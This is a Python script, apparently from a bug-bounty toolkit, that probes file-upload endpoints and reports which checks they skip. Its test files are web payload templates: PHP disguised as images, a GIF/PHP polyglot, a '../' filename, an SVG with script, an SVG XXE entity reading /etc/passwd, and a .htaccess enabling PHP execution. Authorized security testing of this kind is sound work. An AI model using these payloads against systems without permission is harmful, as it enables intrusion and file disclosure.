#!/usr/bin/env python3
"""
upload_probe.py — file-upload abuse testing
============================================

Tier 4 tester.

Purpose
-------
ssrfprobe.py treats upload URL fields purely as an SSRF injection surface
(URL fields → metadata/internal payloads). But file uploads have their own
vulnerability class:
  - Extension/MIME/magic-byte mismatch (server allows .php upload but only
    checks Content-Type: image/jpeg — bypass with double extension)
  - Polyglot files (valid image + embedded payload — e.g., GIF89a + PHP code)
  - Path-traversal via filename (filename="../../etc/cron.d/pwn" → write
    outside upload dir)
  - Unrestricted upload → RCE (.jsp, .phtml, .shtml)
  - SVG upload → XSS / XXE
  - Content-type sniffing → XSS via image/svg with embedded <script>

This tool probes upload endpoints discovered by jsreaper.py / paramfuzz.py
with a controlled set of test files and reports which validations (if any)
are enforced.

Chain position
--------------
Layer 3 — Input: jsreaper.py output (look for upload endpoints by URL pattern)
                OR paramfuzz.py output (find URL params likely to be uploads).
          Output: upload-findings.json.
          Persisted: pipeline_state.db.

Safety
------
This tool only uploads TEST files containing benign markers
("UPLOADPROBE_<random>"). It does NOT attempt to execute uploaded files or
perform path traversal beyond a benign probe (e.g., filename="../probe.txt"
— never overwriting real files). If the server allows the upload, we flag
it as a finding; we never try to access the uploaded file or trigger its
execution.

Usage
-----
    python -m toolkit.testers.upload_probe \\
        --input js-findings.json \\
        --scope scope.yaml \\
        --output upload-findings.json

Author : Bug Bounty Toolkit / Tier 4
License : MIT (for authorized use only)
"""

from __future__ import annotations

import argparse
import asyncio
import datetime
import json
import logging
import random
import re
import string
import sys
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

from toolkit.infra import scope_guard
from toolkit.infra.finding import compute_finding_id
from toolkit.infra.pipeline_state import PipelineState


log = logging.getLogger("upload_probe")

# Upload endpoint URL patterns (heuristic — what jsreaper discovered that
# looks like an upload endpoint).
_UPLOAD_URL_RE = re.compile(
    r"/(?:upload|uploads|file|files|attachment|attachments|media|asset|assets|"
    r"image|images|avatar|avatars|photo|photos|profile-pic|document|documents)/?",
    re.IGNORECASE,
)
# Param names that often hold files
_UPLOAD_PARAM_RE = re.compile(
    r"^(?:file|upload|attachment|image|avatar|photo|document|"
    r"profile_pic|profilepic|media|asset|files?\d*|img|pic)$",
    re.IGNORECASE,
)


def _gen_token() -> str:
    return "UPLOADPROBE_" + "".join(random.choices(string.ascii_lowercase + string.digits, k=8))


# ── Test file templates ─────────────────────────────────────────────────────

@dataclass
class TestFile:
    name: str                  # filename to send
    content_type: str          # Content-Type to send
    body: bytes                # file content
    expect_blocked: bool       # True if a secure server SHOULD reject this
    vuln_class: str            # what finding class to emit if accepted
    severity: str
    detail: str


def _build_test_files(token: str) -> list[TestFile]:
    """Build a small set of test files covering each upload vuln class.
    Every file body contains the unique token so we can later prove which
    upload succeeded."""
    return [
        # 1. Benign image — should succeed. Used as a baseline.
        TestFile(
            name=f"benign_{token}.png",
            content_type="image/png",
            body=b"\x89PNG\r\n\x1a\n" + token.encode() + b"\x00" * 16,
            expect_blocked=False, vuln_class="UPLOAD_OK",
            severity="INFO",
            detail="Baseline: benign PNG upload accepted (expected).",
        ),
        # 2. Extension mismatch — .php file claiming to be image/jpeg
        TestFile(
            name=f"shell_{token}.php",
            content_type="image/jpeg",
            body=b"\xff\xd8\xff\xe0" + token.encode() + b"<?php echo '" + token.encode() + b"'; ?>",
            expect_blocked=True, vuln_class="UPLOAD_EXTENSION_MISMATCH",
            severity="HIGH",
            detail="Server accepted a .php file with Content-Type: image/jpeg. "
                   "If the uploaded file is later served/executed as PHP, this is RCE.",
        ),
        # 3. Double extension — file.jpg.php
        TestFile(
            name=f"shell_{token}.jpg.php",
            content_type="image/jpeg",
            body=b"\xff\xd8\xff\xe0" + token.encode() + b"<?php echo '" + token.encode() + b"'; ?>",
            expect_blocked=True, vuln_class="UPLOAD_DOUBLE_EXTENSION",
            severity="HIGH",
            detail="Server accepted a .jpg.php double-extension file. Apache httpd's mod_mime "
                   "treats .php as executable regardless of the .jpg prefix → RCE on serve.",
        ),
        # 4. Polyglot — GIF89a header + PHP code (valid GIF start + PHP)
        TestFile(
            name=f"poly_{token}.php",
            content_type="image/gif",
            body=b"GIF89a" + token.encode() + b"<?php echo '" + token.encode() + b"'; ?>",
            expect_blocked=True, vuln_class="UPLOAD_POLYGLOT",
            severity="HIGH",
            detail="Server accepted a GIF/PHP polyglot. The file is a valid GIF but also "
                   "contains executable PHP. If served by PHP-FPM, RCE.",
        ),
        # 5. Path traversal via filename
        TestFile(
            name=f"../{token}.txt",
            content_type="text/plain",
            body=b"path-traversal probe " + token.encode(),
            expect_blocked=True, vuln_class="UPLOAD_PATH_TRAVERSAL",
            severity="HIGH",
            detail="Server accepted a filename containing '../' — upload is not confined "
                   "to the upload directory. Attacker can write to arbitrary paths.",
        ),
        # 6. SVG with embedded <script> (XSS)
        TestFile(
            name=f"xss_{token}.svg",
            content_type="image/svg+xml",
            body=(b'<?xml version="1.0"?>\n<svg xmlns="http://www.w3.org/2000/svg">'
                  b'<script type="text/ecmascript">alert("' + token.encode() + b'")</script></svg>'),
            expect_blocked=True, vuln_class="UPLOAD_SVG_XSS",
            severity="MEDIUM",
            detail="Server accepted an SVG with embedded <script>. If the SVG is served "
                   "inline (Content-Type: image/svg+xml), browsers execute the script → XSS.",
        ),
        # 7. SVG with XXE
        TestFile(
            name=f"xxe_{token}.svg",
            content_type="image/svg+xml",
            body=(b'<?xml version="1.0"?>\n<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
                  b'<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>'),
            expect_blocked=True, vuln_class="UPLOAD_SVG_XXE",
            severity="HIGH",
            detail="Server accepted an SVG with an XXE entity. If the SVG is parsed server-side "
                   "(e.g., for thumbnails), file disclosure / SSRF via XXE.",
        ),
        # 8. .htaccess upload (Apache config override)
        TestFile(
            name=f".htaccess_{token}",
            content_type="text/plain",
            body=b"# upload probe " + token.encode() + b"\nAddType application/x-httpd-php .pwn",
            expect_blocked=True, vuln_class="UPLOAD_HTACCESS",
            severity="CRITICAL",
            detail="Server accepted a .htaccess upload. Attacker can override Apache config "
                   "in the upload directory, e.g., enable PHP execution for arbitrary extensions.",
        ),
    ]


@dataclass
class UploadResult:
    endpoint: str
    test_file: str
    vuln_class: str
    expected_blocked: bool
    actually_blocked: bool
    severity: str
    detail: str
    response_status: int
    response_snippet: str
    token: str


async def upload_one(client, endpoint: str, method: str, param_name: str,
                     tf: TestFile, headers: dict[str, str] | None = None) -> UploadResult:
    """Send one file upload and return the result. We use multipart/form-data.
    'Blocked' is defined as: HTTP status in 4xx/5xx, OR response body contains
    words like 'error', 'invalid', 'rejected'."""
    try:
        files = {param_name: (tf.name, tf.body, tf.content_type)}
        h = {"User-Agent": "Mozilla/5.0 (compatible; UploadProbe/1.0)",
             "Accept": "*/*"}
        if headers:
            h.update(headers)
        if method.upper() == "POST":
            r = await client.post(endpoint, files=files, headers=h, timeout=15.0)
        elif method.upper() == "PUT":
            # PUT the raw body with the Content-Type
            h["Content-Type"] = tf.content_type
            r = await client.put(endpoint, content=tf.body, headers=h, timeout=15.0)
        else:
            r = await client.request(method, endpoint, files=files, headers=h, timeout=15.0)
        status = int(r.status_code or 0)
        body = (r.text or "")[:500]
    except Exception as exc:
        log.debug("upload failed: %s %s — %s", method, endpoint, exc)
        return UploadResult(
            endpoint=endpoint, test_file=tf.name, vuln_class=tf.vuln_class,
            expected_blocked=tf.expect_blocked, actually_blocked=True,
            severity="INFO", detail=f"upload failed: {exc}",
            response_status=0, response_snippet="", token="",
        )
    blocked = status in (400, 401, 403, 404, 405, 406, 413, 415, 422, 500, 501)
    if not blocked:
        # Check for soft-block via error words in body
        body_low = body.lower()
        if any(w in body_low for w in ("error", "invalid", "rejected", "not allowed", "forbidden")):
            blocked = True
    return UploadResult(
        endpoint=endpoint, test_file=tf.name, vuln_class=tf.vuln_class,
        expected_blocked=tf.expect_blocked, actually_blocked=blocked,
        severity=tf.severity if (tf.expect_blocked and not blocked) else "INFO",
        detail=tf.detail if (tf.expect_blocked and not blocked) else
               (f"Expected {'blocked' if tf.expect_blocked else 'allowed'}, "
                f"actually {'blocked' if blocked else 'allowed'}."),
        response_status=status, response_snippet=body,
        token=tf.name,
    )


def find_upload_endpoints(findings: list[dict[str, Any]]) -> list[dict[str, Any]]:
    """Heuristically find upload endpoints in jsreaper / paramfuzz output.
    Returns list of {url, method, param_name}."""
    out: list[dict[str, Any]] = []
    seen: set[tuple[str, str, str]] = set()
    for f in findings:
        url = f.get("url") or f.get("endpoint") or ""
        method = (f.get("method") or "POST").upper()
        param = f.get("param_name") or ""
        if not url:
            continue
        is_upload_url = bool(_UPLOAD_URL_RE.search(url))
        is_upload_param = bool(_UPLOAD_PARAM_RE.match(param)) if param else False
        if is_upload_url or is_upload_param:
            key = (url, method, param or "file")
            if key in seen:
                continue
            seen.add(key)
            out.append({"url": url, "method": method, "param_name": param or "file"})
    return out


async def scan_endpoint(endpoint: str, method: str, param_name: str,
                        guard: scope_guard.ScopeGuard) -> list[UploadResult]:
    try:
        guard.check_url(endpoint, source_tool="upload_probe.py")
    except scope_guard.ScopeError as exc:
        log.warning("scope reject %s — %s", endpoint, exc)
        return []
    try:
        import httpx
    except ImportError:
        log.error("httpx required for upload_probe.py")
        return []
    token = _gen_token()
    test_files = _build_test_files(token)
    results: list[UploadResult] = []
    async with httpx.AsyncClient(timeout=15.0, verify=False, follow_redirects=False) as client:
        for tf in test_files:
            if not guard.acquire_token(timeout=20.0):
                continue
            try:
                r = await upload_one(client, endpoint, method, param_name, tf)
            finally:
                guard.release_token()
            results.append(r)
            log.info("  %s → %s (blocked=%s, severity=%s)",
                     tf.name, r.response_status, r.actually_blocked, r.severity)
    return results


def to_normalized(results: list[UploadResult]) -> list[dict[str, Any]]:
    from urllib.parse import urlparse
    out: list[dict[str, Any]] = []
    for r in results:
        # Only emit findings for tests that expected blocked but weren't
        if not (r.expected_blocked and not r.actually_blocked):
            continue
        host = urlparse(r.endpoint).hostname or ""
        evidence = f"{r.endpoint}|{r.test_file}|{r.response_status}|{r.token}"
        fid = compute_finding_id("upload_probe.py", host, r.vuln_class, evidence)
        out.append({
            "id": fid,
            "source_tool": "upload_probe.py",
            "host": host,
            "url": r.endpoint,
            "vuln_class_key": r.vuln_class,
            "severity": r.severity,
            "title": f"Upload accepted: {r.test_file}",
            "detail": r.detail,
            "evidence": evidence,
            "remediation": (
                "Validate file content (magic bytes), not just Content-Type or extension. "
                "Maintain an allowlist of permitted extensions. Store uploads outside the "
                "web root or serve via a separate domain with Content-Disposition: attachment. "
                "Disable server-side execution in the upload directory. Reject path traversal "
                "in filenames (basename only). Reject SVGs with <script> or DOCTYPE declarations."
            ),
            "raw": {
                "test_file": r.test_file,
                "response_status": r.response_status,
                "response_snippet": r.response_snippet[:300],
                "token": r.token,
            },
            "confidence": "candidate",
            "disposition": "new",
            "verified_by": None,
            "typical_payout": "$500-$5000" if r.severity in ("HIGH", "CRITICAL") else "$100-$1000",
        })
    return out


def main() -> int:
    ap = argparse.ArgumentParser(
        prog="upload_probe.py",
        description="File-upload abuse tester. Extends ssrfprobe.py's URL-field handling.",
    )
    src = ap.add_mutually_exclusive_group(required=True)
    src.add_argument("--input", "-i", help="jsreaper.py or paramfuzz.py JSON output")
    src.add_argument("--url", help="direct upload endpoint URL")
    ap.add_argument("--method", default="POST", help="HTTP method (default: POST)")
    ap.add_argument("--param", default="file", help="upload form param name (default: file)")
    ap.add_argument("--scope", help="scope.yaml path")
    ap.add_argument("--output", "-o", default="upload-findings.json")
    ap.add_argument("--db", default="pipeline_state.db")
    ap.add_argument("-v", "--verbose", action="store_true")
    args = ap.parse_args()

    logging.basicConfig(
        level=logging.DEBUG if args.verbose else logging.INFO,
        format="[%(levelname)s] %(message)s",
    )

    endpoints: list[dict[str, Any]] = []
    if args.url:
        endpoints = [{"url": args.url, "method": args.method, "param_name": args.param}]
    else:
        in_path = Path(args.input)
        if not in_path.exists():
            log.error("input not found: %s", in_path)
            return 2
        data = json.loads(in_path.read_text(encoding="utf-8"))
        findings: list[dict[str, Any]] = []
        if isinstance(data, list):
            findings = data
        elif isinstance(data, dict):
            findings = (data.get("findings") or data.get("all_findings")
                        or data.get("all_endpoints") or data.get("endpoints") or [])
            # also pull host_results[].endpoints
            for hr in data.get("host_results", []) or []:
                findings.extend(hr.get("endpoints") or [])
        endpoints = find_upload_endpoints(findings)
    log.info("upload endpoints: %d", len(endpoints))

    guard = scope_guard.ScopeGuard(args.scope) if args.scope else scope_guard.get_default()
    state = PipelineState(args.db)
    try:
        all_results: list[UploadResult] = []
        for ep in endpoints:
            log.info("scanning %s (%s via %s)", ep["url"], ep["method"], ep["param_name"])
            results = asyncio.run(scan_endpoint(ep["url"], ep["method"], ep["param_name"], guard))
            all_results.extend(results)
        normalized = to_normalized(all_results)
        for f in normalized:
            state.upsert_finding(f)
        out_path = Path(args.output)
        out_path.write_text(
            json.dumps({
                "scan_time": datetime.datetime.now(datetime.timezone.utc).isoformat(timespec="seconds"),
                "endpoints_scanned": len(endpoints),
                "total_uploads_attempted": len(all_results),
                "total_findings": len(normalized),
                "findings": normalized,
            }, indent=2, default=str),
            encoding="utf-8",
        )
        log.info("wrote %s", out_path)
        return 0
    finally:
        state.close()


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\n[!] Interrupted.")
        sys.exit(0)
